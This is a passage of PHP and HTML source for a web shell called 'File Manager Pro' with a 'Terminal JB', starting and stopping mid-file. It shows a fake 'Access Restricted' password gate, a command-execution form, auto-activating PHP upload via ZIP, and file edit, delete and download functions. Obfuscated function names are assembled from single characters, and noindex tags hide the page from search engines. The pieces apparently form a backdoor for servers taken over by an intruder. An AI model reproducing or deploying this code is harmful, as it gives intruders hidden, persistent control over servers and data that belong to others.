        <meta name='viewport' content='width=device-width, initial-scale=1.0'>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
    font-family: 'Courier New', monospace;
    background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.9)), 
                url('https://i.ibb.co.com/mCFf1r8b/photo-2026-06-26-22-20-43.jpg') no-repeat center center fixed;
    background-size: cover;
    color: var(--text-primary);
    padding: 20px;
    min-height: 100vh;
}
            .login-container {
                background: #111111;
                padding: 40px;
                border-radius: 10px;
                box-shadow: 0 15px 35px rgba(255,255,255,0.1);
                width: 100%;
                max-width: 400px;
                animation: slideUp 0.5s ease;
                border: 1px solid #333333;
            }
            @keyframes slideUp {
                from { opacity: 0; transform: translateY(20px); }
                to { opacity: 1; transform: translateY(0); }
            }
            h1 { color: #ffffff; margin-bottom: 10px; font-size: 24px; text-align: center; }
            .error-message {
                background: #330000;
                color: #ff6666;
                padding: 12px;
                border-radius: 5px;
                margin-bottom: 20px;
                text-align: center;
                border: 1px solid #660000;
            }
            .info-message {
                background: #1a3300;
                color: #99ff99;
                padding: 12px;
                border-radius: 5px;
                margin-bottom: 20px;
                text-align: center;
                border: 1px solid #336600;
            }
            form { margin-top: 20px; }
            input[type='password'] {
                width: 100%; padding: 12px; margin-bottom: 15px;
                border: 2px solid #333333;
                background: #222222;
                color: #ffffff;
                border-radius: 5px; font-size: 16px;
                transition: border-color 0.3s;
            }
            input[type='password']:focus {
                outline: none; border-color: #666666;
            }
            input[type='submit'] {
                width: 100%; padding: 12px;
                background: #333333;
                color: white; border: none; border-radius: 5px; font-size: 16px;
                font-weight: 600; cursor: pointer; transition: all 0.2s;
            }
            input[type='submit']:hover {
                background: #444444;
                box-shadow: 0 5px 15px rgba(255,255,255,0.1);
            }
            .server-info {
                margin-top: 20px; padding-top: 20px;
                border-top: 1px solid #333333; text-align: center;
                color: #999999; font-size: 14px;
            }
        </style>
    </head>
    <body>
        <div class='login-container'>
            <h1>🔒 Access Restricted</h1>
            <div class='error-message'>You don't have permission to access this page</div>
            <div class='info-message'>Please enter the password to continue</div>
            <form method='post'>
                <input type='password' name='pass' placeholder='Enter password' required>
                <input type='submit' value='Authenticate'>
            </form>
            <div class='server-info'>
                <strong>Server:</strong> <?php echo $_SERVER["HTTP_HOST"]; ?><br>
                <strong>Port:</strong> 80
            </div>
        </div>
    </body>
    </html>
    <?php
}

function generateEditForm($fileName, $fileContent) {
    $htm = "h" . "t" . "m" . "l" . "s" . "p" . "e" . "c" . "i" . "a" . "l" . "c" . "h" . "a" . "r" . "s";
    return '<div class="result-box-container">
        <div class="card">
            <div class="card-header">
                <i class="fas fa-file-code"></i> Editing: ' . $fileName . '
            </div>
            <div class="card-body">
                <form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '">
                    <input type="hidden" name="csrf_token" value="' . $_SESSION['csrf_token'] . '">
                    <textarea name="content" class="code-editor">' . $htm($fileContent) . '</textarea>
                    <input type="hidden" name="edit_file" value="' . $fileName . '">
                    <button type="submit" class="btn btn-primary" style="margin-top: 15px;">
                        <i class="fas fa-save"></i> Save Changes
                    </button>
                </form>
            </div>
        </div>
    </div>';
}

function generateTerminalJBOutput($command, $output) {
    $htm = "h" . "t" . "m" . "l" . "s" . "p" . "e" . "c" . "i" . "a" . "l" . "c" . "h" . "a" . "r" . "s";
    $currentDir = getcwd();
    
    return '<div class="result-box-container">
        <div class="card">
            <div class="card-header" style="background: #222222; color: #00ff00;">
                <i class="fas fa-terminal"></i> Terminal JB - Command Output
            </div>
            <div class="card-body">
                <div style="background: #111111; padding: 10px; border-radius: 5px; margin-bottom: 15px; border-left: 4px solid #00ff00;">
                    <span style="color: #00ff00; font-weight: bold;">$</span> <span style="color: #ffffff;">' . $htm($command) . '</span>
                    <br>
                    <span style="color: #888888; font-size: 12px;">Directory: ' . $htm($currentDir) . '</span>
                </div>
                <pre class="command-output" style="background: #000000; color: #00ff00; padding: 20px; border-radius: 5px; max-height: 500px; overflow-y: auto;">' . $htm($output) . '</pre>
                <div style="margin-top: 15px; display: flex; gap: 10px;">
                    <button onclick="this.parentElement.parentElement.parentElement.parentElement.remove()" class="btn btn-primary" style="padding: 5px 15px;">
                        <i class="fas fa-times"></i> Close Output
                    </button>
                </div>
            </div>
        </div>
    </div>';
}

function handleDelete($path, $name) {
    $unl = "u" . "n" . "l" . "i" . "n" . "k";
    
    if (!file_exists($path)) {
        return ['type' => 'error', 'message' => 'Error: File or directory not found!'];
    }
    
    if (is_dir($path)) {
        if (deleteDirectory($path)) {
            return ['type' => 'success', 'message' => 'Folder deleted successfully: ' . $name];
        }
    } else {
        if ($unl($path)) {
            return ['type' => 'success', 'message' => 'File deleted successfully: ' . $name];
        }
    }
    return ['type' => 'error', 'message' => 'Error: Failed to delete!'];
}

function handleRename($old, $new, $oldName) {
    if (file_exists($old)) {
        if (rename($old, $new)) {
            return ['type' => 'success', 'message' => 'Item renamed successfully: ' . $oldName];
        }
    }
    return ['type' => 'error', 'message' => 'Error: Failed to rename item!'];
}

function deleteDirectory($dir) {
    $unl = "u" . "n" . "l" . "i" . "n" . "k";
    if (!file_exists($dir)) return true;
    if (!is_dir($dir)) return $unl($dir);
    
    $scd = "s" . "c" . "a" . "n" . "d" . "i" . "r";
    foreach ($scd($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) return false;
    }
    return rmdir($dir);
}

// ============================================
// HTML OUTPUT STARTS HERE
// ============================================
?>
<!DOCTYPE html>
<html>
<head>
    <title>File Manager Pro - hans</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="robots" content="noindex, nofollow, noarchive">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --bg-primary: #000000;
            --bg-secondary: #0a0a0a;
            --bg-tertiary: #111111;
            --bg-card: #1a1a1a;
            --bg-hover: #222222;
            --text-primary: #ffffff;
            --text-secondary: #cccccc;
            --text-muted: #999999;
            --border-color: #333333;
            --border-light: #222222;
            --accent-primary: #444444;
            --accent-secondary: #555555;
            --accent-success: #00cc66;
            --accent-danger: #ff4444;
            --accent-warning: #ffaa00;
            --accent-info: #3399ff;
            --accent-zip: #ffaa00;
            --accent-php: #787CB5;
            --accent-terminal: #00ff00;
            --folder-color: #ffaa00;
            --file-color: #3399ff;
            --php-color: #787CB5;
            --root-color: #ffaa00;
            --terminal-color: #00ff00;
            --shadow: 0 5px 20px rgba(0, 255, 0, 0.2);
            --radius: 10px;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Courier New', monospace;
            background: linear-gradient(rgba(0, 255, 0, 0.05), rgba(0, 0, 0, 0.9)), 
                        url('https://i.ibb.co/NnyHXG0d/1e7bcc618f7afe4c75529f510aa7209f.jpg') no-repeat center center fixed;
            background-size: cover;
            color: var(--text-primary);
            padding: 20px;
            min-height: 100vh;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: var(--bg-secondary);
            border-radius: 20px;
            box-shadow: var(--shadow);
            overflow: hidden;
            animation: slideIn 0.5s ease;
            border: 1px solid var(--border-color);
        }

        @keyframes slideIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Header */
        .header {
            background: var(--bg-tertiary);
            color: var(--text-primary);
            padding: 30px;
            border-bottom: 1px solid var(--border-color);
        }

        .header h1 {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
        }

        .header h1 i { font-size: 32px; color: var(--accent-terminal); }

        .badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 600;
            margin-left: 15px;
        }

        .terminal-badge {
            background: #003300;
            color: var(--accent-terminal);
            border: 1px solid #00ff00;
        }

        .php-badge {
            background: #2c2b3a;
            color: var(--accent-php);
            border: 1px solid #5f5b7a;
        }

        .root-badge {
            background: #332200;
            color: var(--root-color);
            border: 1px solid #665500;
        }

        .system-info {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            padding-top: 15px;
            border-top: 1px solid var(--border-color);
        }

        .info-item {
            background: var(--bg-card);
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
            border: 1px solid var(--border-light);
            color: var(--text-secondary);
        }

        .status-badge {
            display: inline-flex;
            align-items: center;
            gap: 5px;
            padding: 4px 10px;
            border-radius: 15px;
            font-size: 12px;
            font-weight: 600;
        }

        .status-on { background: #003322; color: #00ff99; border: 1px solid #006633; }
        .status-off { background: #330000; color: #ff6666; border: 1px solid #660000; }

        /* Alerts */
        .alert {
            margin: 20px 30px;
            padding: 15px 20px;
            border-radius: var(--radius);
            display: flex;
            align-items: center;
            gap: 10px;
            animation: slideIn 0.3s ease;
            border-left: 4px solid;
        }

        .alert-success {
            background: #003322;
            color: #00ff99;
            border-left-color: #00ff99;
        }

        .alert-success a {
            color: #66ffcc;
        }

        .alert-danger {
            background: #330000;
            color: #ff6666;
            border-left-color: #ff4444;
        }

        .alert-info {
            background: #002233;
            color: #66ccff;
            border-left-color: #3399ff;
        }

        .alert-warning {
            background: #332200;
            color: #ffcc66;
            border-left-color: #ffaa00;
        }

        .alert a {
            color: inherit;
            text-decoration: underline;
        }

        /* Navigation */
        .navigation {
            background: var(--bg-tertiary);
            padding: 20px 30px;
            border-bottom: 1px solid var(--border-color);
        }

        .path-navigation {
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
            background: var(--bg-card);
            padding: 12px 20px;
            border-radius: var(--radius);
            margin-bottom: 20px;
            border: 1px solid var(--border-light);
        }

        .path-navigation a {
            color: var(--text-secondary);
            text-decoration: none;
            font-weight: 500;
            padding: 5px 10px;
            border-radius: 5px;
            transition: all 0.3s;
        }

        .path-navigation a:hover {
            background: var(--bg-hover);
            color: var(--text-primary);
        }

        .home-link {
            background: var(--accent-terminal) !important;
            color: var(--bg-primary) !important;
            padding: 5px 15px !important;
            font-weight: 600 !important;
        }

        /* Action Cards */
        .action-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }

        .action-card {
            background: var(--bg-card);
            border-radius: var(--radius);
            padding: 20px;
            transition: all 0.3s;
            border: 1px solid var(--border-light);
        }

        .action-card:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow);
            border-color: var(--accent-secondary);
        }

        .action-card h3 {
            font-size: 16px;
            margin-bottom: 15px;
            color: var(--text-primary);
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .action-card h3 i { color: var(--accent-success); }
        .zip-card { border-left: 4px solid var(--accent-zip); }
        .zip-card h3 i { color: var(--accent-zip); }
        .terminal-card { border-left: 4px solid var(--accent-terminal); }
        .terminal-card h3 i { color: var(--accent-terminal); }

        .action-card form {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .action-card input[type="text"],
        .action-card input[type="password"],
        .action-card input[type="number"] {
            width: 100%;
            padding: 10px;
            background: var(--bg-tertiary);
            border: 1px solid var(--border-light);
            border-radius: 5px;
            font-size: 14px;
            color: var(--text-primary);
        }

        .action-card input[type="file"] {
            width: 100%;
            padding: 8px;
            background: var(--bg-tertiary);
            border: 1px solid var(--border-light);
            border-radius: 5px;
            color: var(--text-secondary);
        }

        .action-card .btn { width: 100%; justify-content: center; }
        .action-card small {
            color: var(--text-muted);
            font-size: 11px;
            text-align: center;
        }

        /* Buttons */
        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            display: inline-flex;
            align-items: center;
            gap: 5px;
            font-size: 14px;
        }

        .btn-primary { 
            background: var(--accent-primary); 
            color: var(--text-primary);
            border: 1px solid var(--border-color);
        }
        .btn-primary:hover { background: var(--accent-secondary); }
        
        .btn-success { 
            background: #00aa55; 
            color: var(--bg-primary);
        }
        .btn-success:hover { background: #00cc66; }
        
        .btn-danger { 
            background: #cc3333; 
            color: var(--text-primary);
        }
        .btn-danger:hover { background: #ff3333; }
        
        .btn-warning { 
            background: #cc8800; 
            color: var(--bg-primary);
        }
        .btn-warning:hover { background: #ffaa00; }

        .btn-zip {
            background: #cc8800;
            color: var(--bg-primary);
            font-weight: 700;
        }
        .btn-zip:hover { background: #ffaa00; }

        .btn-terminal {
            background: #00aa00;
            color: var(--bg-primary);
            font-weight: 700;
        }
        .btn-terminal:hover { background: #00ff00; }

        .btn-icon {
            padding: 8px 12px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
            color: var(--text-primary);
            font-size: 14px;
        }

        .btn-view { background: #0066aa; }
        .btn-delete { background: #aa3333; }
        .btn-rename { background: #aa8800; }
        .btn-download { background: #00aa55; }
        .btn-info { background: #6644aa; }

        /* Upload Area */
        .upload-area {
            background: var(--bg-tertiary);
            padding: 30px;
            margin: 0 30px 20px 30px;
            border-radius: var(--radius);
            border: 1px solid var(--border-color);
        }

        .upload-form {
            display: flex;
            gap: 15px;
            align-items: center;
            flex-wrap: wrap;
        }

        .file-input {
            flex: 1;
            background: var(--bg-card);
            padding: 10px;
            border-radius: 5px;
            color: var(--text-secondary);
            border: 1px solid var(--border-light);
        }

        .file-input::-webkit-file-upload-button {
            background: var(--accent-primary);
            color: var(--text-primary);
            padding: 8px 15px;
            border: none;
            border-radius: 5px;
            font-weight: 600;
            cursor: pointer;
            margin-right: 10px;
            border: 1px solid var(--border-color);
        }

        /* Cards */
        .card {
            background: var(--bg-tertiary);
            border-radius: var(--radius);
            border: 1px solid var(--border-color);
            margin: 20px 30px;
            overflow: hidden;
        }

        .card-header {
            background: var(--bg-card);
            padding: 15px 20px;
            font-weight: 600;
            border-bottom: 1px solid var(--border-color);
            display: flex;
            align-items: center;
            gap: 10px;
            color: var(--text-primary);
        }

        .card-body { 
            padding: 20px;
            background: var(--bg-tertiary);
        }

        .code-editor {
            width: 100%;
            min-height: 200px;
            padding: 15px;
            background: var(--bg-primary);
            color: #00ff00;
            font-family: 'Courier New', monospace;
            border-radius: 5px;
            border: 1px solid var(--border-color);
            resize: vertical;
        }

        .command-output {
            background: var(--bg-primary);
            color: #00ff00;
            padding: 15px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            word-wrap: break-word;
            border: 1px solid var(--border-color);
            max-height: 400px;
            overflow: auto;
        }

        /* Section Headers */
        .section-header {
            margin: 30px 30px 15px 30px;
            padding: 10px 15px;
            background: var(--bg-card);
            border-radius: var(--radius);
            border-left: 4px solid;
            display: flex;
            align-items: center;
            gap: 10px;
            font-weight: 600;
            font-size: 16px;
        }

        .folder-section { border-left-color: var(--folder-color); }
        .file-section { border-left-color: var(--file-color); }
        .trash-section { border-left-color: #ff4444; }

        .section-count {
            margin-left: auto;
            background: var(--bg-tertiary);
            padding: 3px 10px;
            border-radius: 15px;
            font-size: 12px;
            color: var(--text-muted);
        }

        /* Tables */
        .table-container {
            margin: 0 30px 30px 30px;
            overflow-x: auto;
            border-radius: var(--radius);
            border: 1px solid var(--border-color);
        }

        table {
            width: 100%;
            border-collapse: collapse;
            min-width: 900px;
        }

        th {
            background: var(--bg-card);
            color: var(--text-primary);
            font-weight: 600;
            font-size: 14px;
            padding: 15px;
            text-align: left;
            border-bottom: 1px solid var(--border-color);
        }

        td {
            padding: 12px 15px;
            border-bottom: 1px solid var(--border-light);
            font-size: 14px;
            color: var(--text-secondary);
        }

        tr:hover { background: var(--bg-hover); }

        .folder-row td:first-child i { color: var(--folder-color); }
        .file-row td:first-child i { color: var(--file-color); }
        .php-file td:first-child i { color: var(--php-color); }
        .root-row { background: rgba(255, 170, 0, 0.1); }
        .trash-row { opacity: 0.7; }

        .badge-small {
            display: inline-flex;
            align-items: center;
            gap: 3px;
            padding: 2px 8px;
            border-radius: 12px;
            font-size: 10px;
            font-weight: 600;
            margin-left: 8px;
        }

        .root-badge-small {
            background: #332200;
            color: var(--root-color);
            border: 1px solid #665500;
        }

        .php-badge-small {
            background: #2c2b3a;
            color: var(--php-color);
            border: 1px solid #5f5b7a;
        }

        .item-name a {
            color: var(--text-secondary);
            text-decoration: none;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .item-name a:hover { color: var(--accent-success); }

        .permission {
            font-family: 'Courier New', monospace;
            font-weight: 600;
        }

        .rename-form {
            display: flex;
            gap: 5px;
        }

        .rename-form input[type="text"] {
            width: 100px;
            padding: 5px;
            background: var(--bg-tertiary);
            border: 1px solid var(--border-light);
            border-radius: 3px;
            font-size: 12px;
            color: var(--text-primary);
        }

        .checkbox-cell {
            text-align: center;
        }

        .checkbox-cell input[type="checkbox"] {
            transform: scale(1.2);
            cursor: pointer;
        }

        .empty-state {
            text-align: center;
            padding: 40px;
            color: var(--text-muted);
        }

        .footer {
            padding: 20px 30px;
            text-align: center;
            color: var(--text-muted);
            border-top: 1px solid var(--border-color);
            background: var(--bg-tertiary);
        }

        @media (max-width: 768px) {
            .action-grid { grid-template-columns: 1fr; }
            .upload-form { flex-direction: column; }
            .file-input { width: 100%; }
            .btn { width: 100%; justify-content: center; }
            .header h1 { font-size: 20px; }
            .badge { margin-left: 0; margin-top: 5px; }
        }
    </style>
</head>
<body>
    <div class="container">
        
        <!-- HEADER -->
        <div class="header">
            <h1>
                <i class="fas fa-terminal"></i> 𝔣𝔦𝔩𝔢 𝔪𝔞𝔫𝔞𝔤𝔢𝔯 𝔭𝔯𝔬
                <span class="badge terminal-badge"><i class="fas fa-terminal"></i> Terminal JB</span>
                <span class="badge php-badge"><i class="fab fa-php"></i> PHP Auto-Pilot</span>
                <?php if ($isRoot): ?>
                    <span class="badge root-badge"><i class="fas fa-crown"></i> ROOT</span>
                <?php endif; ?>
            </h1>
            <div class="system-info">
                <span class="info-item"><i class="fas fa-microchip"></i> Kernel: <?php echo (function_exists('php_uname') ? php_uname() : '???'); ?></span>
                <span class="info-item"><i class="fas fa-clock"></i> Time: <?php echo date('Y-m-d H:i:s'); ?></span>
                <span class="info-item"><i class="fas fa-globe"></i> Timezone: <?php echo $timezone; ?></span>
                <span class="info-item">
                    <i class="fas fa-envelope"></i> mail(): 
                    <span class="status-badge <?php echo function_exists('mail') ? 'status-on' : 'status-off'; ?>">
                        <i class="fas <?php echo function_exists('mail') ? 'fa-check-circle' : 'fa-times-circle'; ?>"></i>
                        <?php echo function_exists('mail') ? 'ON' : 'OFF'; ?>
                    </span>
                </span>
                <span class="info-item">
                    <i class="fas fa-cog"></i> putenv(): 
                    <span class="status-badge <?php echo function_exists('putenv') ? 'status-on' : 'status-off'; ?>">
                        <i class="fas <?php echo function_exists('putenv') ? 'fa-check-circle' : 'fa-times-circle'; ?>"></i>
                        <?php echo function_exists('putenv') ? 'ON' : 'OFF'; ?>
                    </span>
                </span>
                <?php if ($isRoot): ?>
                    <span class="info-item" style="background: #332200; color: #ffaa00; border-color: #665500;">
                        <i class="fas fa-crown"></i> ROOT Access
                    </span>
                <?php endif; ?>
            </div>
        </div>

        <!-- ALERTS -->
        <?php foreach ($alertMessages as $alert): ?>
            <div class="alert alert-<?php echo $alert['type']; ?>">
                <i class="fas <?php echo $alert['type'] == 'success' ? 'fa-check-circle' : ($alert['type'] == 'error' ? 'fa-exclamation-circle' : 'fa-info-circle'); ?>"></i>
                <?php echo $alert['message']; ?>
            </div>
        <?php endforeach; ?>

        <!-- FILE INFO CONTENT -->
        <?php echo $fileInfoContent; ?>

        <!-- NAVIGATION -->
        <div class="navigation">
            
            <!-- PATH -->
            <div class="path-navigation">
                <i class="fas fa-folder-open" style="color: var(--accent-success);"></i>
                <?php
                $directories = $expl(DIRECTORY_SEPARATOR, $currentDirectory);
                $currentPath = '';
                foreach ($directories as $index => $dir) {
                    $currentPath .= DIRECTORY_SEPARATOR . $dir;
                    echo '/<a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
                }
                ?>
                <a href="?d=<?php echo x($rootDirectory); ?>" class="home-link">
                    <i class="fas fa-home"></i> Home
                </a>
            </div>

            <!-- ACTION CARDS -->
            <div class="action-grid">
                
                <!-- Search -->
                <div class="action-card">
                    <h3><i class="fas fa-search"></i> Search Files</h3>
                    <form method="post">
                        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                        <input type="text" name="search_term" placeholder="Search term..." required>
                        <label style="display:flex;align-items:center;gap:5px;color:var(--text-muted);font-size:12px;">
                            <input type="checkbox" name="recursive" value="1" checked> Recursive search
                        </label>
                        <button type="submit" class="btn btn-primary">
                            <i class="fas fa-search"></i> Search
                        </button>
                    </form>
                </div>

                <!-- ZIP Upload -->
                <div class="action-card zip-card">
                    <h3><i class="fas fa-file-archive"></i> Upload ZIP → Files</h3>
                    <form method="post" enctype="multipart/form-data">
                        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                        <input type="file" name="zipToUpload" accept=".zip" required>
                        <button type="submit" class="btn btn-zip">
                            <i class="fas fa-bolt"></i> Upload & Extract
                        </button>
                        <small>PHP files auto-aktif (0755) | Langsung ke folder ini</small>
                    </form>
                </div>

                <!-- Terminal JB -->
                <div class="action-card terminal-card">
                    <h3><i class="fas fa-terminal"></i> Terminal JB</h3>
                    <form method="post" action="?<?php echo isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : ''; ?>">
                        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                        <input type="text" name="terminal_jb_cmd" placeholder="Enter command..." required>
                        <button type="submit" class="btn btn-terminal">
                            <i class="fas fa-play"></i> Execute
                        </button>
                    </form>
                </div>

                <!-- Create Folder -->
                <div class="action-card">
                    <h3><i class="fas fa-folder-plus"></i> Create Folder</h3>
                    <form method="post" action="?<?php echo isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : ''; ?>">
                        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                        <input type="text" name="folder_name" placeholder="Folder name..." required>
                        <button type="submit" class="btn btn-success"><i class="fas fa-plus"></i> Create</button>
                    </form>
                </div>

                <!-- Create File -->
                <div class="action-card">
                    <h3><i class="fas fa-file-plus"></i> Create File</h3>
                    <form method="post" action="?<?php echo isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : ''; ?>">
                        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                        <input type="text" name="file_name" placeholder="File name..." required>
                        <button type="submit" class="btn btn-success"><i class="fas fa-plus"></i> Create</button>
                    </form>
                </div>

                <!-- Empty Trash -->
                <?php if (!empty($trashItems)): ?>
                <div class="action-card">
                    <h3><i class="fas fa-trash"></i> Empty Trash</h3>
                    <form method="post" onsubmit="return confirm('Are you sure you want to empty trash? This action cannot be undone!');">
                        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                        <p style="color:var(--text-muted);font-size:12px;"><?php echo count($trashItems); ?> items in trash</p>
                        <button type="submit" name="empty_trash" class="btn btn-danger">
                            <i class="fas fa-trash"></i> Empty Trash
                        </button>
                    </form>
                </div>
                <?php endif; ?>

            </div>
        </div>

        <!-- UPLOAD AREA -->
        <div class="upload-area">
            <h3><i class="fas fa-cloud-upload-alt"></i> Upload File (Non-ZIP)</h3>
            <form method="post" enctype="multipart/form-data" class="upload-form">
                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                <input type="file" name="fileToUpload" id="fileToUpload" class="file-input" required>
                <button type="submit" class="btn btn-primary" name="submit">
                    <i class="fas fa-upload"></i> Upload
                </button>
            </form>
            <small style="color:var(--text-muted);">Allowed: <?php echo implode(', ', $config['allowed_extensions']); ?> | Max: <?php echo $config['max_upload_size'] / 1024 / 1024; ?>MB</small>
        </div>

        <!-- PREVIEW CONTENT -->
        <?php if (!empty($previewContent)): ?>
            <div class="card">
                <div class="card-header">
                    <i class="fas fa-eye"></i> File Preview
                </div>
                <div class="card-body">
                    <?php echo $previewContent; ?>
                    <button onclick="this.parentElement.parentElement.style.display='none'" class="btn btn-primary" style="margin-top:15px;">
                        <i class="fas fa-times"></i> Close Preview
                    </button>
                </div>
            </div>
        <?php endif; ?>

        <!-- COMMAND RESULT -->
        <?php echo $viewCommandResult; ?>

        <!-- FOLDERS -->
        <?php if (!empty($folders)): ?>
            <div class="section-header folder-section">
                <i class="fas fa-folder"></i> Folders
                <span class="section-count"><?php echo count($folders); ?> items</span>
            </div>
            
            <div class="table-container">
                <form method="post" id="batchForm">
                    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                    <table>
                        <thead>
                            <tr>
                                <th style="width:30px;"><input type="checkbox" onclick="toggleAll(this)"></th>
                                <th>Name</th>
                                <th>Size</th>
                                <th>Modified</th>
                                <th>Perm</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($folders as $v): 
                                $u = $currentDirectory . '/' . $v;
                                $permission = substr(sprintf('%o', fileperms($u)), -4);
                            ?>
                                <tr class="folder-row">
                                    <td class="checkbox-cell"><input type="checkbox" name="selected_files[]" value="<?php echo $v; ?>"></td>
                                    <td class="item-name">
                                        <a href="?d=<?php echo x($currentDirectory . '/' . $v); ?>">
                                            <i class="fas fa-folder"></i> <?php echo $v; ?>
                                        </a>
                                    </td>
                                    <td>--</td>
                                    <td><?php echo date('Y-m-d H:i:s', filemtime($u)); ?></td>
                                    <td class="permission"><?php echo $permission; ?></td>
                                    <td>
                                        <div style="display:flex;gap:5px;flex-wrap:wrap;">
                                            <form method="post" style="display:inline;">
                                                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                                <input type="hidden" name="download_file" value="<?php echo $htm($v); ?>">
                                                <button type="submit" class="btn-icon btn-download" title="Download"><i class="fas fa-download"></i></button>
                                            </form>
                                            <form method="post" style="display:inline;">
                                                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                                <input type="hidden" name="view_file" value="<?php echo $htm($v); ?>">
                                                <button type="submit" class="btn-icon btn-view" title="View"><i class="fas fa-eye"></i></button>
                                            </form>
                                            <form method="post" style="display:inline;">
                                                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                                <input type="hidden" name="info_file" value="<?php echo $htm($v); ?>">
                                                <button type="submit" class="btn-icon btn-info" title="Info"><i class="fas fa-info-circle"></i></button>
                                            </form>
                                            <form method="post" style="display:inline;" onsubmit="return confirm('Delete <?php echo $v; ?>?');">
                                                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                                <input type="hidden" name="delete_file" value="<?php echo $htm($v); ?>">
                                                <button type="submit" class="btn-icon btn-delete" title="Delete"><i class="fas fa-trash"></i></button>
                                            </form>
                                            <form method="post" style="display:inline;" class="rename-form">
                                                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                                <input type="hidden" name="old_name" value="<?php echo $htm($v); ?>">
                                                <input type="text" name="new_name" placeholder="New name" required>
                                                <button type="submit" name="rename_item" class="btn-icon btn-rename" title="Rename"><i class="fas fa-pencil-alt"></i></button>
                                            </form>
                                        </div>
                                    </td>
                                </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                    <div style="padding:15px;background:var(--bg-card);border-top:1px solid var(--border-color);display:flex;gap:10px;flex-wrap:wrap;">
                        <button type="submit" name="batch_delete" class="btn btn-danger" onclick="return confirm('Delete selected items?');">
                            <i class="fas fa-trash"></i> Delete Selected
                        </button>
                        <button type="submit" name="batch_zip" class="btn btn-warning">
                            <i class="fas fa-file-archive"></i> Create ZIP
                        </button>
                    </div>
                </form>
            </div>
        <?php endif; ?>

        <!-- FILES -->
        <?php if (!empty($files)): ?>
            <div class="section-header file-section">
                <i class="fas fa-file"></i> Files
                <span class="section-count"><?php echo count($files); ?> items</span>
            </div>
            
            <div class="table-container">
                <form method="post" id="batchForm2">
                    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                    <table>
                        <thead>
                            <tr>
                                <th style="width:30px;"><input type="checkbox" onclick="toggleAll2(this)"></th>
                                <th>Name</th>
                                <th>Size</th>
                                <th>Modified</th>
                                <th>Perm</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($files as $v): 
                                $u = $currentDirectory . '/' . $v;
                                $permission = substr(sprintf('%o', fileperms($u)), -4);
                                $size = filesize($u);
                                $sizeFormatted = $size < 1024 ? $size . ' B' : 
                                                ($size < 1048576 ? round($size/1024, 2) . ' KB' : 
                                                round($size/1048576, 2) . ' MB');
                                $isPhp = (strtolower(pathinfo($v, PATHINFO_EXTENSION)) == 'php');
                            ?>
                                <tr class="file-row <?php echo $isPhp ? 'php-file' : ''; ?>">
                                    <td class="checkbox-cell"><input type="checkbox" name="selected_files[]" value="<?php echo $v; ?>"></td>
                                    <td class="item-name">
                                        <a href="?d=<?php echo x($currentDirectory); ?>&preview=<?php echo x($v); ?>">
